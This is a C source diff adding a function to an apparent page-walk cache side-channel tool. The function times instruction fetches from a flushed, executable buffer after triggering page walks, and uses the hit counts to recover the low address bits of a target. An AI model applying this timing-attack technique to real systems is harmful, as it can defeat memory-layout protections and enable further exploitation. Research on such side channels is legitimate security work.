@@ -9,6 +9,7 @@
 #include "mapping.h"
 #include "pwsc.h"
 #include "solver.h"
+#include <errno.h>
 
 /* PWSC Parameters */
 static setup_page_walk_trigger_t setup_page_walk_trigger;
@@ -89,6 +90,73 @@ void evict_page_caches(struct orderOracle *order_oracle, uint64_t cache_line,
   }
 }
 
+struct pwsc_ans get_inst_page_set(uint64_t target_address,
+                                  struct pwsc_ans partial_ans) {
+  struct pwsc_ans ans = partial_ans;
+  uint64_t trash;
+  ans.va.po_set = 0;
+  ans.va.po_co = 0;
+  fprintf(stdout,
+          "We found the higher bits to be %lx, we must now find the lower 12 "
+          "bits\n",
+          ans.va.va);
+
+  int *indexes = generate_indexes(64);
+  hit_count hits[64];
+
+  for (int i = 0; i < 64; ++i) {
+    hits[i].hits = 0;
+    hits[i].index = i;
+  }
+
+  char *va_buffer = mmap(
+      (void *)ans.va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
+      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
+
+  if (va_buffer == MAP_FAILED) {
+    fprintf(stderr, "mmap Failed\n");
+    exit(1);
+  }
+  memset(va_buffer, 0xC3, 4096);
+
+  for (int round = 0; round < 512; ++round) {
+
+    setup_page_walk_trigger(target_address, 1, trash);
+    _mm_mfence();
+    _mm_lfence();
+
+    for (int i = 0; i < 4096; i += 64) {
+      clflush((uint64_t *)(va_buffer + i), trash);
+    }
+
+    _mm_mfence();
+    _mm_lfence();
+
+    trigger_page_walk(target_address, 1, trash);
+
+    _mm_mfence();
+    _mm_lfence();
+
+    for (int i = 0; i < 64; ++i) {
+      int index = indexes[i];
+      size_t offset = index * 64;
+      trash = 0;
+      uint64_t *addr = (uint64_t *)(va_buffer + offset);
+      uint64_t time = time_access_inst(addr, trash);
+      trash = (trash | time) & (MSB_MASK - 1); // dependency
+      if (time < 150) {
+        hits[index].hits++;
+      }
+    }
+    _mm_mfence();
+    _mm_lfence();
+  }
+
+  qsort(hits, 64, sizeof(hit_count), sort_descending);
+  fprintf(stdout, "The index is %lu\n", hits[0].index);
+  ans.va.po_set = hits[0].index;
+  return ans;
+}
 /*
         Auxillary function for profile_cache. This will record a set of timing
    measurements for all line offsets (this is essentially one trial of the
